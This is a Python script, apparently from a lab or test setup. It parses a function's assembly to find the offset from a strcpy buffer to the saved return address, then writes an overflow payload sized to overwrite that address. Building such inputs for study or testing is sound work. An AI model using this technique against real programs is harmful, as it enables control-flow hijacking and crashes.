#!/usr/bin/env python3
import argparse
import re
from pathlib import Path


def function_lines(asm_path, name):
    lines = Path(asm_path).read_text(encoding="utf-8", errors="ignore").splitlines()
    start = next(i for i, line in enumerate(lines) if re.match(rf"^\s*{name}:", line))
    end = next((i for i in range(start + 1, len(lines)) if ".seh_endproc" in lines[i]), len(lines) - 1)
    return lines[start : end + 1]


def return_cover_len(asm_path, name):
    frame_size = None
    buffer_offset = None
    last_rcx = None

    for line in function_lines(asm_path, name):
        match = re.search(r"\bsubq\s+\$(\d+),\s*%rsp\b", line)
        if match:
            frame_size = int(match.group(1))

        match = re.search(r"\bleaq\s+(-?\d+)\(%rsp\),\s*%rcx\b", line)
        if match:
            last_rcx = int(match.group(1))

        if re.search(r"\bcallq\s+strcpy\b", line):
            buffer_offset = last_rcx

    if frame_size is None or buffer_offset is None:
        raise RuntimeError("could not parse vulnerable stack layout from assembly")

    return frame_size - buffer_offset + 8


parser = argparse.ArgumentParser()
parser.add_argument("-o", "--output", default="input")
parser.add_argument("--asm", default="subject.s")
parser.add_argument("--function", default="vulnerable")
args = parser.parse_args()

body_len = return_cover_len(args.asm, args.function)
payload = b"R" * body_len + b"\x00"
Path(args.output).write_bytes(payload)
print(f"body length covering return address: {body_len}")
print(f"wrote {len(payload)} bytes to {Path(args.output).resolve()}")
